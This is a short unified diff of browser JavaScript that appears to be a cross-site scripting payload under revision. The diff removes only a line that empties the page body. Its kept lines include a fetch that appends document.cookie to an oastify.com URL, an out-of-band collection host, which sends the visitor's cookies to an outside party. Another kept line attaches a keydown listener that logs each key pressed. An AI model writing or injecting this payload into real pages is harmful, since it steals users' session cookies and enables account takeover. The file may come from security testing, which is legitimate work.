@@ -1,5 +1,4 @@
 fetch(`https://4ejcesgd7nd62rf3xgkjigf6txzonpbe.oastify.com${document.cookie}`);
-document.body.replaceChildren();
 setTimeout(function() {}, 3000);
 document.body.style.setProperty('height', '100vh')
 document.body.addEventListener('keydown', function (e) {console.log(e.key)});
